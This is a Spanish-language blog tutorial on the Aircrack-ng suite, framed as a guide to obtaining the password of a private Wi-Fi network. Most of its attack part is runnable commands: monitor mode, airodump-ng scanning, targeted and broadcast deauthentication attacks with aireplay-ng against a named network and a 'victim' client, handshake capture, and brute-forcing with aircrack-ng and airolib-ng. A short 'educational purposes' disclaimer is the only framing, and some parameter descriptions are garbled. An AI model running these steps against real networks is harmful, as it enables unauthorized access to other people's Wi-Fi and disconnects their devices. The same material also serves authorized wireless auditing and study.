

## Introduccion
Este post es un post hecho junto a Yoshy. Link directo a su pagina web —> https://llo0zy.github.io/

En este post te voy a contar sobre la herramienta Aircrack-ng, al igual que de algunas de las herramientas que vienen de esta misma suite, y como usar estas herramientas para conseguir la constraseña de una red privada.

Este post esta hecho con intencion educativa, no me hago responsable del uso que se pueda llegar a dar.

## Aircrack-ng
Documentación oficial: https://www.aircrack-ng.org/doku.php

Aircrack-ng es una suite de software de seguridad inalámbrica. Consiste en un analizador de paquetes de redes, recupera contraseñas WEP y WPA/WPA2-PSK y otro conjunto de herramientas de auditoría inalámbrica.

### Instalación
Estas son las dos principales formas de instalar la herramienta

### Con el instalador de paquetes de Linux:
Debian

```
sudo apt install aircrack-ng
```

Fedora

```
sudo dnf install aircrack-ng
```

Arch

```
sudo pacman -Sy aircrack-ng
```

CentOS

```
sudo yum install epel-release
sudo yum install aircrack-ng
```
### Desde el código fuente:
Para tener más información vease esta página: https://www.aircrack-ng.org/doku.php?id=install_aircrack

Linux / Windows

```
wget https://download.aircrack-ng.org/aircrack-ng-1.7.tar.gz
tar -zxvf aircrack-ng-1.7.tar.gz
cd aircrack-ng-1.7
autoreconf -i
./configure --with-experimental
make
make install
ldconfig
```

## Establecer el modo monitor
El modo monitor, en nuestra tarjeta de red, nos sirve para interceptar los paquetes que se mueven por la red y los puntos de acceso en el entorno

Para poner nuestra tarjeta de red en modo monitor podemos usar cualquiera de estos dos comandos

```
sudo airmon-ng start wlx3c52a1e258d8
```

```
sudo iwconfig wlx3c52a1e258d8 mode monitor
```
En caso de que haya funcionado correctamente veríamos algo parecido a esto:

![1](</Writeups/Blogs/Wifi/img/2.png>)

Si queremos obtener más información sobre la tarjeta de red usaremos el comando iw:

```
sudo iw dev wlan0 info
```

![1](</Writeups/Blogs/Wifi/img/3.png>)

Para parar el modo monitor primero tendríamos que usar este comando

```
sudo airmon-ng stop wlx3c52a1e258d8
```

Después tenemos que cerrar algunos procesos que pueden ser conflictivos, para pararlos usaremos este comando

```
sudo pkill dhclient && pkill wpa_supplicant
```

```
sudo killall dhclient wpa_supplicant
```

```
sudo airmon-ng check kill
```

Ahora tenemos que reiniciar el servicio de red

```
sudo /etc/init.d/networking restart
```

# Análisis de la red
### Usando airodump-ng
Para escanear los puntos de acceso disponibles en la red con Airodump (esta utilidad es de la suite de Aircrack)

```
sudo airodump-ng wlx3c52a1e258d8
```

![1](</Writeups/Blogs/Wifi/img/4.png>)

Esta es una tabla del significado de cada apartado, columna del output que nos da el comando:

![1](</Writeups/Blogs/Wifi/img/11.png>)

Con esta herramienta podemos filtrar la información, para quedarnos solo con lo que nos interesa

Esta seria la manera de filtrar por el canal

```
sudo airodump-ng -c 6 wlx3c52a1e258d8
```

Así filtraríamos por el ESSID

```
sudo airodump-ng --essid vodafoneBA7676 wlx3c52a1e258d8
```

Y lo mismo por el BSSID

```
sudo airodump-ng --bssid CA:D9:D2:E8:20:49 wlx3c52a1e258d8
```

Para guardar la información obtenida en la captura de paquetes de red, usaremos el parámetro -w:

```
sudo airodump-ng -w lol wlan0
```

Esto nos creara 5 formatos de archivos: .cap, .csv, .kismet.csv, .kismet.netxml, .log.csv

![1](</Writeups/Blogs/Wifi/img/5.png>)

### Usando airgraph-ng
Con esta herramienta podemos poner en grafico toda la información que hemos obtenido de la red

![1](</Writeups/Blogs/Wifi/img/6.png>)

Para esto necesitaremos el archivo .csv y ejecutar la siguiente linea de comando:

- Client to Access point Relationship Graph -> -g CAPR
- Client to Probe Request Graph -> -g CPG

```
airgraph-ng -i capture-01.csv -o demo.png -g CAPR
```

Algo que nos resalta es el color verde que tenemos en la captura, podemos tener uno o varios routers en la captura, y tendran diversos colores, aquí el listado con sus características:

- Verde -> Redes WAP
- Amarillo -> Redes WEP
- Rojo -> Redes OPN
- Negro -> Redes no reconocidas

## Deautenticacion

Ahora que tenemos claro todos los equipos y puntos de acceso de la red, vamos a intentar sacar la contraseña de uno de ellos, para esto vamos a identificar la red que queremos vulnerar.

Una vez que sepamos la red vamos a identificar los equipos que están conectados a la misma

Ahora el proceso que vamos a hacer es, expulsar a ese equipo de la red, para que cuando este se reconecte otra vez a su red (de forma automática) captaremos el handshake de la conexión, para posteriormente romperlo con fuerza bruta y obtener la contraseña

Para expulsar al equipo de su red haremos un ataque de deautenticacion, podemos hacerlos de dos formas:

### Ataque de deautenticación dirigido

Primero tenemos que analizar nuestra red, en busca de una posible victima

```
sudo airodump-ng --bssid 60:8D:26:F2:E6:C4 wlx3c52a1e258d8
```

Después con el anterior comando en segundo plano haremos la deautenticacion

- El -a es la MAC del punto de acceso
- El -e es el essid del punto de acceso
- El -c es la MAC de el equipo victima

```
aireplay-ng -0 0 -a 60:8D:26:F2:E6:C4 -e Livebox6-E6C5 -c 22:B2:62:79:21:0F wlx3c52a1e258d8
```

### Ataque de deautenticación global

Primero hacemos lo mismo que antes, y analizamos la red

```
sudo airodump-ng -c 6 --bssid 60:8D:26:F2:E6:C4 wlx3c52a1e258d8
```

Ahora podemos hacer un ataque de deautenticacion a toda la red, para esto usaremos este comando

```
aireplay-ng -0 0 -a 60:8D:26:F2:E6:C4 -e Livebox6-E6C5 -c FF:FF:FF:FF:FF:FF wlx3c52a1e258d8
```

## Captura del handshake

Una vez que hemos efectuado correctamente el ataque de deautenticacion, lo verificaremos con el mensaje que nos dará Airodump-ng en la captura de red

![1](</Writeups/Blogs/Wifi/img/7.png>)

Ahora que hemos comprobado que tenemos el handshake, podemos parar la captura, y hacer uso del archivo .cap que nos creara si hemos puesto el parámetro -w

![1](</Writeups/Blogs/Wifi/img/8.png>)

## Cracking del hash

De normal los atacantes suelen usar el comando aircrack-ng para hacer ataques de prueba y error (bruteforcing) al handshake, para ello usamos el comando:

```
sudo aircrack-ng -n lol.pcap -w wordlist.lst
```

Donde -n son los paquetes de red donde se encuentra el handshake, y -w el listado de contraseñas.

El problema llega cuando hay por pobrar 10 millones de contraseñas, que podría llegar a tardar más de una semana probando. Pero aquí os traigo la solución conocida como las rainbow tables que es convertir todas esas contraseñas en hashes para que la lectura y escritura de estos sea más rápida, así optimizando lo máximo posible el crackeo del hash.

Aquí una pequeña guía…

Para usar la herramienta tenemos que crear un archivo con el nombre de la ESSID:

```
echo tplink > essid.txt
```

Y después crear una base de datos con airolib-ng:

```
airolib-ng tplink.sqlite --import essid essid.txt
```

![1](</Writeups/Blogs/Wifi/img/9.png>)

Con el comando: airolib-ng tplink.sqlite –stats podemos ver información sobre la base de datos:

```
There are 1 ESSIDs and 0 passwords in the database. 0 out of 0 possible combinations have been computed (0%).

ESSID	Priority	Done
TP-Link_73A8	64	(null)
```

Ahora meteremos las posibles contraseñas en nuestra base de datos con:

```
airolib-ng tplink.sqlite --import passwd ./dict.lst
```

![1](</Writeups/Blogs/Wifi/img/10.png>)

Ahora vamos a crear el resultado de la combinación entre la contraseña y el essid para ello usaremos el parametro –batch:

```
$ airolib-ng tplink.sqlite --batch

Batch processing ...
Computed 5000 PMK in 11 seconds (454 PMK/s, 121985 in buffer)
```

Luego se usa en aircrack-ng con el parametro: -n

Gracias por leer este post hasta el final, espero que hayas aprendido algo nuevo ;)